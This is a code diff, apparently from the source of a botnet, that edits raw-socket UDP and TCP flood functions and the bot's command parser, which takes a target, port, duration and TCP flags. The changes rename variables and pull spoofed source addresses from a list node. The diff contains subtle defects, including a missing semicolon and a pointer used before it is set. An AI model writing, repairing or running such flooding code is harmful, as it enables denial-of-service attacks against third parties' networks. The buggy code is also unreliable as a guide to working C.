@@ -178,6 +178,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
 {
         struct sockaddr_in dest_addr;
         struct ifreq ifr;
+	struct list *list_node;
 
         dest_addr.sin_family = AF_INET;
         if(port == 0) dest_addr.sin_port = rand_cmwc();
@@ -233,7 +234,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
                 }
                 memset(&ifr, 0, sizeof(ifr));
                 snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
-                if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
+                if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
                        printf("Error binding to interface.");
                 }
                 int counter = 50;
@@ -247,7 +248,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
                 struct iphdr *iph = (struct iphdr *)packet;
                 struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
 
-                makeIPPacket(iph, dest_addr.sin_addr.s_addr, data.sin_addr.s_addr, IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
+                makeIPPacket(iph, dest_addr.sin_addr.s_addr, list_node->data.sin_addr.s_addr, IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
 
                 udph->len = htons(sizeof(struct udphdr) + packetsize);
                 udph->dest = (port == 0 ? rand_cmwc() : htons(port));
@@ -277,10 +278,11 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
                         i++;
                 }
 }
-void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int pollinterval)
+void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval)
 {
         struct sockaddr_in dest_addr;
         struct ifreq ifr;
+	struct list *list_node
 
         dest_addr.sin_family = AF_INET;
         if(port == 0) dest_addr.sin_port = rand_cmwc();
@@ -343,7 +345,7 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
         struct iphdr *iph = (struct iphdr *)packet;
         struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
 
-        makeIPPacket(iph, dest_addr.sin_addr.s_addr, data.sin_addr.s_addr, IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
+        makeIPPacket(iph, dest_addr.sin_addr.s_addr, list_node->data.sin_addr.s_addr, IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
 
         tcph->seq = rand_cmwc();
         tcph->ack_seq = 0;
@@ -862,7 +864,7 @@ void *BotWorker(int argc, char *argv[ ], void *sock) {
                                                        printf("TCP <target> <port (0 for random)> <time> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                        return;
                                            }
-			                   unsigned char *ip = argv[1];
+			                   unsigned char *target = argv[1];
                                            int port = atoi(argv[2]);
                                            int time = atoi(argv[3]);
                                            unsigned char *flags = argv[4];
